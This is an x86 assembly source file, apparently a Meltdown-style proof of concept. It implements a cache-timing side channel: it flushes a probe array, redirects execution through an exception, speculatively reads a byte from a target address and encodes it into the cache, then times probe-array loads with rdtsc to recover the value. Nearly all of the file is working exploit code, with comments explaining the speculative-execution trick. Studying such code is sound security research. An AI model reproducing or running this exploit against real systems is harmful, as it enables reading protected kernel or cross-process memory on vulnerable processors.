.model flat,c
.code
; by Li Mo
; phylimo@163.com

EXTRN probeArray: DWORD
EXTRN timings:    DWORD
EXTRN raise_exp_f: DWORD
EXTRN secret: DWORD

_read_time PROC PUBLIC
	;this is proc read time as the side channel for secret content
		push ebx
                push ecx
		push edi
                push esi

		mov ebx, ((1000h * 100h) / 40h / 40h)
		mov edi, probeArray
		mov esi, timings

_read_timing_loop:
        mfence
        lfence
        rdtsc
        lfence
		push ebx
        mov ecx, eax
        mov ebx, dword ptr [edi] ; read from cacheline in probearray
        lfence
        rdtsc
        sub eax, ecx ; 

        ; store timing in timings table (r13)
        mov dword ptr [esi], eax
        add esi, 04h

        add edi, (40h * 40h) ; increment rdi by 0x40 cachelines
		pop ebx
        dec ebx
        jnz _read_timing_loop

		pop esi
                pop edi
                pop ecx
		pop ebx
		ret

_read_time ENDP


; rcx - secret addr to read
_my_leak PROC PUBLIC
    ; save nonvolatile register
    push ebp
    mov ebp, esp   ;  ebp + 0x8 存储的是传递的参数的堆栈位置
   push ebx
     push ecx
    push edx
    push edi
    push esi

	;invalid the secret string cache.
	mov eax, secret
	add eax, 1000h * 250
	clflush [eax]    

	mfence

	; invalidate probeArray
	mov eax, probeArray
	mov ecx,  ((1000h * 100h) / 40h) ; 0x100000 byte divided by cacheline size (64byte)
	_cache_invalidate_loop:
		; invalidate cacheline
		clflush [eax]
		add eax, 40h
		dec ecx
		jnz _cache_invalidate_loop

	mfence
	mov esi, probeArray ; probe array base speculative execution
	
        mov edi, [ebp + 8]   ; //第一个参数（即待猜测的内存地址）此时应该这样获得
	mov edx, raise_exp_f
	xor eax, eax ; clear eax
	call edx  ;  the execution flow is redirected here. 

	;NOTE: 
	; The following codes will never be executed "explicitly" because the function raise_exp redirects the execution flow.
	; However, the codes may be executed "implicitly" within CPU due to the out-of-order execution mechanism. And this impliclit execution causes some change in CPU cache.

    mov al,  byte ptr [edi] ; speculative invalid access
	and eax, 00ffh
    shl eax, 0ch
    mov edx, dword ptr [esi + eax] ; access cacheline in probeArray. side channel.


    
    ret
_my_leak ENDP

END
